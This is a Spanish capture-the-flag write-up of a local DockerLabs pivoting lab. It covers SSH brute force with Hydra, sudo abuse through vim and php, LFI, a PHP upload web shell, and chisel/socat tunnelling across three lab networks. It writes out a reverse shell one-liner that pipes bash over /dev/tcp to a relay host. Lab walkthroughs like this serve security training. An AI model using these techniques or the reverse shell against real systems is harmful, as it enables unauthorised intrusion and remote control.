# WriteUps
CTF Pivoting – DockerLabs (LittlePivoting)

Hoy os comparto un WriteUp de la maquina LittlePivoting de DockerLabs la cual me ha ayudado a recordar como realizar pivoting entre diferentes redes, cosa que llevaba bastante tiempo sin realizar. 
Antes que nada, “Pivoting” es una técnica la cual permite a un atacante acceder a máquinas que estén en distintas redes.
Para desplegar el laboratorio, descargaremos el .zip desde el siguiente enlace o accederemos a la página oficial de DockerLabs y descargaremos el laboratorio “LittlePivoting”.
Una vez descargado,
1.	Descomprimimos el .zip
 

2.	Damos permisos de ejecución al archivo “auto_deploy.sh”
 

3.	Desplegamos el entorno.
 

Perfecto, ya tenemos el entorno listo para empezar. Nuestra máquina atacante tendrá la IP 10.10.10.1 y las redes serán las siguientes:
 
Esquema de red

Primera máquina vulnerable
Lo primero que vamos a hacer es escanear la maquina con la que tenemos conexión (TRUST 10.10.10.2) en busca de puertos abiertos con la herramienta Nmap
 
Encontramos los puertos 22 (ssh) y 80 (http) abiertos. Ahora, vamos a emplear Nmap otra vez, pero con una serie de parámetros para obtener la versión y servicios corriendo en estos puertos.

 
Perfecto, en el puerto 22 tenemos SSH y en el 80 el servicio de Apache2. 
Accedemos a la web
 
Tanto en la web como en el código (Cntl+U) de la misma no encontramos nada, por lo que vamos a emplear la herramienta gobuster para intentar encontrar directorios dentro de esta web.
 
Encontramos un archivo secret.php el cual nos lleva a la siguiente página:
 
Al no encontrar nada más, suponemos que “Mario” podría ser un usuario del sistema y si recordamos también estaba el puerto 22 abierto. Por lo que vamos a intentar hacer fuerza bruta al ssh para conseguir la contraseña de Mario. Emplearemos la herramienta hydra y el famoso diccionario rockyou:

 
Perfecto!! La contraseña del usuario “mario” para establecer una conexión ssh con la primera máquina es “chocolate”. Vamos a conectarnos y a ver que encontramos.
 
Nos encontramos en su home, nuestra finalidad es conseguir elevar privilegios al usuario “root” en cada máquina. Al leer el archivo “/etc/passwd” y no encontrar más usuarios aparte que el de “mario”, suponemos que la escalada será directamente al usuario “root” sin pasar por elevaciones laterales.
Si ejecutamos el comando sudo -l observamos que podemos ejecutar el binario vim con privilegios elevados.
Una muy buena página que nos va a ayudar a saber como aprovecharnos de este binario y escalar a root es GTFOBins
 
En el buscador escribimos “vim” y seleccionamos la opción de “Sudo”, la cual nos dirá cómo explotar la vulnerabilidad.
 
Usaremos la opción a) y listo, somos root de la primera máquina.
 (bash -p)

Perfecto, ahora deberemos conocer qué otra red hay en esta máquina. Para ello usaremos el comando hostname -I
 
La nueva red es la 20.20.20.X, vamos a pasarnos desde nuestra máquina atacante un script para realizar un escaneo:
Máquina atacante
 
Primera máquina vulnerable
 
Script
 
(el escaneo lo realizamos sobre la red “20.20.20.x” que es la que acabamos de descubrir anteriormente con el comando hostname -I)
Al no tener “ping” ni “nc” la máquina vulnerable, nos aprovechamos de “/dev/tcp/”

Bien, obtenemos la ip “20.20.20.2” (la de esta misma máquina), y la 20.20.20.3 (la nueva máquina descubierta).
¿Pues, volvamos a realizar todo el mismo proceso que hemos hecho con la anterior máquina verdad? 
Pues no, aquí nos encontramos con el problema de que a esta nueva red 20.20.20.x no tenemos conexión directa desde nuestra máquina atacante que se encuentra en la red 10.10.10.x. Por lo que comienza el pivoting.

Para tener conexión desde nuestra red a esta nueva, deberemos emplear túneles socks5 con la herramienta chisel, la cual también tendremos que pasarla a la máquina vulnerada como hicimos con el escáner.

Máquina atacante
Creamos el servidor chisel
 
Primera máquina vulnerable
Nos conectamos al servidor chisel creado anteriormente y además con acceso a todos los puertos de la máquina vulnerable.
 

Al conectarnos se abrirá el puerto 1080 en la máquina atacante, que es el que hará el intercambio de comunicaciones entre las máquinas.
Si nunca habéis usado socks5 deberéis de añadir esta línea al final del archivo /etc/proxychains4.conf
socks5 127.0.0.1:1080

Perfecto, ahora ya podemos escanear los puertos abiertos a la segunda máquina vulnerable. Para ello pondremos proxychains delante del comando nmap






Segunda máquina vulnerable
 
Al igual que la anterior nos encontramos con los puertos 22 y 80.
Para poder acceder a la web que se encuentra en el puerto 80 tendremos que configurar la extensión FoxyProxy con la siguiente configuración
 
Y podremos acceder a la web
 

Lo mismo, procedemos a realizar fuzzing web para buscar directorios. Con gobuster no podemos usar proxychains, pero si un parámetro de la herramienta –proxy.
 
Encontramos el directorio /shop, que si accedemos a él veremos lo siguiente
 

Si observamos en la parte de abajo, observamos que dice “Error de Sistema: ($_GET['archivo']");” 
Por lo que podemos sospechar de la existencia de una variable de PHP que contendrá el parámetro “archivo” pasado a través de la URL.
(como cuando intentamos realizar un LogPoisoning)

Probamos a realizar un LFI al parámetro “archivo” para ver si podemos leer el documento /etc/passwd
 
Voilá, funcionó. ¿Con que existen dos usuarios, seller y manchi?
Pues como en la anterior máquina usaremos hydra, rockyou y un padre nuestro.







Con seller no consigo nada, por lo que probaré con manchi y obtenemos su contraseña:
 
Nos conectamos y vemos como elevar privilegios.
 
Vaya, se nos complica la cosa… Vamos a intentar fuerza bruta contra el usuario seller mediante el script Linux-Su-Force.sh y el diccionario rockyou.

Estos se lo pasaremos a la primera máquina vulnerable y seguidamente de esta, a la segunda máquina vulnerable.

manchi@497f53443d88:/tmp$ bash Linux-Su-Force.sh seller rockyou.txt
 
Nos conectamos a con seller y con sudo -l vemos que puede ejecutar el binario /usr/bin/php con permisos privilegiados
 
Recurrimos nuevamente a la página GTFOBins y ejecutamos los comandos del apartado “Sudo”
 
 
¡SEGUNDA MÁQUINA VULNERADA!
Ahora, nuevamente usaremos hostname -I para descubrir la nueva red y el script escaner (que modificaremos poniendo la nueva red) para descubrir la IP de la tercera y última máquina.
 
Nueva red: 30.30.30.x
 
Nueva IP: 30.30.30.3

OKAY. Ahora, tenemos el problema de que desde mi maquina atacante 10.10.10.x no podemos ver la nueva red 30.30.30.x, pero esta si puede ver la 20.20.20.x.
Por lo que emplearemos una nueva herramienta llamada socat. Lo que está hará, será permitirnos que con la ayuda de chisel desde la maquina 30.30.30.2, nos conectemos a la máquina 20.20.20.2, y esa conexión será redirigida a la 10.10.10.1, la nuestra.

Mario primera maquina cogemos socat y se la pasamos a manchi/seller segunda maquina y loe ejecutamos 

Primera máquina vulnerable
 



Segunda máquina vulnerable
 

Máquina atacante
 

Tercera máquina vulnerable
Por último, realizamos un escaneo de puertos abiertos a la nueva máquina descubierta anteriormente (30.30.30.3)
 
Para acceder a la web, deberemos realizar una segunda configuración en FoxyProxy:
 


Y podremos acceder:
 
Usamos gobuster en busca de directorios que nos puedan interesar:
 
Bien, vamos a intentar subir un archivo que nos permita ejecutar comandos por la URL. (como en la segunda máquina)
Aún no sabemos si podemos subir archivos .php. En caso de no poder, deberíamos de realizar una fuerza bruta en la subida de archivos, por ejemplo con BurpSuite, y ver que extensiones son válidas.

 

 
Si podemos subir archivos .php. Acedemos a /uploads/ accedemos al archivo cmd.php. Ahora, en la URL probamos a ejecutar el comando id.
 

Perfecto, por lo que podemos intentar enviarnos una reverse shell.
La reverse shell será enviada a la máquina 30.30.30.2:443, la 20.20.20.3, redirigirá todo lo que venga por la 443 hacia la 20.20.20.2:442, y finalmente de la 20.20.20.2:442 a la 10.10.10.1:441

Segunda máquina vulnerable
 
Primera máquina vulnerable
 

Ahora, en la máquina atacante nos ponemos en escucha por el 441 en una nueva terminal ye ejecutamos la reverse shell en la URL
bash -c "bash -i >%26/dev/tcp/30.30.30.2/443 0>%261"
 
 
Ya tendríamos acceso a la tercera y última máquina vulnerable.
Escalamos privilegios
 
Buscamos la manera de escalar privilegios en GTFOBins
 
 

Y ya habríamos terminado el laboratorio.
Hay que mencionar que este laboratorio está pensado para practicar pivoting, por eso de la facilidad de acceder a las máquinas y elevar privilegios.

¡Espero que os haya gustado y aprendido algo nuevo, un saludo!
